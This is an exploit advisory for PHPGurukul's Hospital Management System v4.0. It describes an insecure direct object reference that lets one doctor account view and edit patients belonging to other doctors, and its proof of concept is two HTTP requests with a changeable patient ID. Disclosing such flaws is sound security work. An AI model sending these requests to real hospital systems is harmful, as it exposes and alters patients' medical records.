# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to look up and update the information of patient who is managed by other doctor(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /hospital/hms/doctor/view-patient.php?viewid=2(CHANGE HERE) HTTP/1.1
```

```
POST /hospital/hms/doctor/edit-patient.php?editid=2(CHANGE HERE) HTTP/1.1
...

patname=user1p&patcontact=111112&patemail=user1p%40test.com&gender=Male&pataddress=bbb&patage=20&medhis=0&submit=
```